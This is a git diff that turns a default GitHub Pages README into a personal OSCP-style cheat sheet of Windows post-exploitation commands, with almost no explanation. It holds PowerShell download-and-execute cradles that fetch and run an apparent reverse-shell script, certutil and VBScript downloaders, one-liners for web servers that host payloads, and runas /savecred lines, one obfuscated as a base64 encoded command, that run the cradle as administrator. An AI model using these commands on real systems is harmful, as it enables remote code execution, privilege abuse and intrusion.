@@ -1,37 +1,103 @@
-## Welcome to GitHub Pages
+## my OSCP_note
 
-You can use the [editor on GitHub](https://github.com/Ondrik8/OSCP_note/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+_Download & execute_
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+`C:\> PowerShell (New-Object System.Net.WebClient).DownloadFile('http://192.168.178.16:8000/launcher.bat’,’launcher.bat'); Start-Process ‘launcher.bat'`
 
-### Markdown
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+`PS C:\Users\hillie> IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.16/puckieshell443.ps1')`
+
+
+`c:\Users\Public>certutil -urlcache -split -f http://10.10.14.20/puckieshell443.ps1`
+
+
+
+`PS C:\pentest> certutil.exe -f -split -VerifyCTL http://192.168.178.12/msbuild_nps.xml
+CertUtil: -verifyCTL command FAILED: 0x8009310b (ASN: 267 CRYPT_E_ASN1_BADTAG)
+CertUtil: ASN1 bad tag value met.`
 
 ```markdown
-Syntax highlighted code block
 
-# Header 1
-## Header 2
-### Header 3
+PS C:\pentest> dir *.bin
 
-- Bulleted
-- List
+Directory: C:\pentest
 
-1. Numbered
-2. List
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         5/7/2019   4:16 PM           5462 619bd719eb0f011e589ef17f4fd8693d9ba8d481.bin
 
-**Bold** and _Italic_ and `Code` text
+PS C:\pentest> mv 619bd719eb0f011e589ef17f4fd8693d9ba8d481.bin msbuild_nps.xml
 
-[Link](url) and ![Image](src)
+PS C:\pentest> dir *.xml
+
+Directory: C:\pentest
+
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+-a---- 5/7/2019 4:16 PM 5462 msbuild_nps.xml
+
 ```
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+```markdown
 
-### Jekyll Themes
+ echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs
+ timeout 1
+ echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  &gt;&gt; webdl.vbs
+ timeout 1
+ echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  &gt;&gt; webdl.vbs
+ timeout 1
+ echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  &gt;&gt; webdl.vbs
+ timeout 1
+ echo xHttp.Open "GET", Url, False  &gt;&gt; webdl.vbs
+ timeout 1
+ echo xHttp.Send  &gt;&gt; webdl.vbs
+ timeout 1
+ echo with bStrm      &gt;&gt; webdl.vbs
+ timeout 1
+ echo   .type = 1 '      &gt;&gt; webdl.vbs
+ timeout 1
+ echo   .open      &gt;&gt; webdl.vbs
+ timeout 1
+ echo   .write xHttp.responseBody      &gt;&gt; webdl.vbs
+ timeout 1
+ echo   .savetofile "C:tempwindows-privesc-check2.exe", 2 '  &gt;&gt; webdl.vbs
+ timeout 1
+ echo end with &gt;&gt; webdl.vbs
+ timeout 1
+ echo
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Ondrik8/OSCP_note/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+```
 
-### Support or Contact
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+
+
+_up my server_
+
+python3
+`c:\Python37>python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.98 - - [28/Feb/2019 19:38:58] "GET /puckieshell443.ps1 HTTP/1.1" 200 -`
+
+python2
+`python2 -m SimpleHTTPServer 8080`
+
+ ruby  http server
+`ruby -rwebrick -e “WEBrick::HTTPServer.new
+(:Port => 80, :DocumentRoot => Dir.pwd).start”`
+
+ PHP http server
+`php -S $ip:80`
+
+
+_runas_
+
+`C:\Users\Public> runas /user:HTB\administrator /savecred "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.20/puckieshell443.ps1')"`
+
+
+`c:\Users\Public> runas /user:ACCESS\administrator /savecred "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAwAC8AcAB1AGMAawBpAGUAcwBoAGUAbABsADUAMwAuAHAAcwAxACcAKQA="`
+
+
+__
+
+
+
